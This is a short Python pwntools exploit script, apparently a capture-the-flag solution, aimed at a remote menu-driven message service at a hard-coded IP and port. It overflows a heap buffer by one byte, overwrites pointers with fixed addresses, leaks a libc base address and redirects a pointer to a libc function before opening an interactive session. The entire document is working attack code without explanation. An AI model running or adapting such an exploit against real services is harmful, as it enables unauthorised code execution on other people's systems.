from pwn import *


#s = remote('192.168.0.85',1234)
s = remote('202.120.7.194', 6666)
def add(size,dat):
  s.recvuntil('3. Exit\n')
  s.send('1\n')
  s.recvuntil('Input Message Length:')
  s.send(str(size)+'\n')
  s.recvuntil('Please Input Message:')
  s.send(dat)

add(2015,'A'*2016+'\n')
add(2015,'CCCC\n')
add(2016,'A'*8+'B'*8+p64(0x603260)+p64(0x4007E0)+'\n')
s.recvuntil('3. Exit')
s.send('2\n')
libc = u64(s.recvuntil('\n2.')[-4-6:-4]+'\x00\x00') - 0x6b990
log.info('LIBC : 0x%x'%libc)
s.recvuntil('Delete?')
s.send('1\n')
add(2015,'CCCC\n')
add(2016,'A'*0x10+p64(libc+0x01633E8)+p64(libc+0x41490)+'\n')
s.interactive()
